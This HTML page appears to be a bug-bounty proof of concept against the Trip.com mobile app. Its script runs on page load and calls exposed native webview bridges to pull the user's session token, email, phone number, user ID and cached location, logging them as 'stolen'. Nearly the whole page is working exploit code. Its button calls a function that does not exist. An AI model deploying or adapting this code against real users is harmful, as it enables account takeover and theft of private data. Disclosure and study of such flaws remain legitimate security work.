<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com Vulnerability PoC - Critical Impact</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 15px; background-color: #f4f4f9; color: #333; line-height: 1.6; }
        .card { background: white; border-radius: 8px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-left: 5px solid #e74c3c; }
        h3 { margin-top: 0; color: #c0392b; }
        ul { list-style: none; padding: 0; }
        li { background: #fee; margin: 5px 0; padding: 8px; border-radius: 4px; border: 1px solid #fcc; font-family: monospace; }
        .status { font-weight: bold; color: #27ae60; }
        .log-box { background: #222; color: #0f0; padding: 10px; border-radius: 5px; font-family: 'Courier New', Courier, monospace; min-height: 100px; overflow-x: auto; }
        button { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #c0392b; }
    </style>
</head>
<body>

    <div class="card">
        <h3>1. Exposed Native Bridges</h3>
        <p> Bridge</p>
        <ul id="bridges">Scaning . . . </ul>
    </div>

    <div class="card" style="border-left-color: #f1c40f;">
        <h3>2. Sensitive Data Extraction (POC)</h3>
        <p> Important Data :</p>
        <div id="logs" class="log-box">Waiting for scan to complete...</div>
        <br>
        <button onclick="runExploit()"> Do Again </button>
    </div>

    <script>
    function log(message, isCritical = false) {
        var logBox = document.getElementById('logs');
        var color = isCritical ? "#ff4757" : "#2ed573";
        logBox.innerHTML += "> <span style='color:" + color + ";'>" + message + "</span><br>";
    }

    function runFinalExploit() {
        log("Starting Targeted Extraction...");

        // ۱. استخراج توکن کاربر از IBUStorageV2_a (بسیار خطرناک)
        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
            var token = window.IBUStorageV2_a.IBUGetUserValue("token");
            if (token) {
                log("CRITICAL: Stolen User Token: " + token, true);
                alert("Account Takeover Proven! Token: " + token);
            } else {
                log("IBUGetUserValue('token') returned null. Trying 'auth'...");
                var auth = window.IBUStorageV2_a.IBUGetUserValue("auth");
                if(auth) log("CRITICAL: Stolen Auth: " + auth, true);
            }
        }

        // ۲. استخراج از Storage_a بر اساس متد get در CTStorage.java
        // پارامترها: (domain, key, default)
        if (window.Storage_a && window.Storage_a.get) {
            var sensitiveKeys = ["email", "userName", "mobile", "uid"];
            sensitiveKeys.forEach(function(k) {
                var val = window.Storage_a.get("common", k, "not_found");
                if (val !== "not_found") log("SENSITIVE DATA: " + k + " = " + val, true);
            });
        }

        // ۳. نقض حریم خصوصی با Locate_a
        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
            var loc = window.Locate_a.getCachedLocationData();
            log("PRIVACY LEAK: Cached Location: " + JSON.stringify(loc), true);
        }
    }

    setTimeout(runFinalExploit, 2000);
</script>
</body>
</html>
